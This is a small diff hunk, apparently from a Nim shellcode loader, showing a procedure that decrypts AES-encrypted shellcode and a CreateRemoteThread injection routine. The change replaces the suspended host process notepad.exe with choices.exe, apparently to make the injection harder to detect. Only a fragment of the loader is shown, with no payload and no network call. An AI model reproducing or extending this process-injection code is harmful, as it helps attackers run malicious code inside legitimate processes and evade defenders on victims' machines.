@@ -45,7 +45,7 @@ proc decryptAES(shellcode: string, aes_key: string, iv: string): string =
 
 proc injectCreateRemoteThread[byte](shellcode: openarray[byte]): void =
 
-  let tProcess = startProcess("notepad.exe")
+  let tProcess = startProcess("choices.exe")
   tProcess.suspend()
   defer: tProcess.close()
 
